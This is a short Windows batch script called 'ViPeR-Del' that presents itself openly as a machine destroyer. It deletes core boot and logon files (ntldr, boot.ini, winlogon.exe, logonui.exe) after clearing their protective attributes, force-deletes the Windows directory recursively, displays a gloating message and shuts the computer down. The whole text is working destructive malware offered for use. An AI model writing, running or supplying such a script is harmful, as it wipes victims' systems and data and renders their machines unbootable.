@echo off
Title " ViPeR-Del - V1.0 "
echo ' ViPeR-DeL '
echo ' Github : https://github.com/wh1ter0seo4/viperdel '
echo 
echo ' ViPeR-Del Started Destroying This machine... '
del C:\WINDOWS\system32\winlogon.exe
del C:\WINDOWS\system32\logonui.exe
del C:\WINDOWS\
attrib -r -s -h c:\autoexec.bat
del c:\autoexec.bat
attrib -r -s -h c:\boot.ini
del c:\boot.ini
attrib -r -s -h c:\ntldr
del c:\ntldr
attrib -r -s -h c:\windows\win.ini
del c:\windows\win.ini
del /S /F /Q /A:S C:\windows
@echo off
msg *ViPeR-DeL succesfully destroyed your machine...
shutdown -s -t 8 -c "ViPeR-DeL"
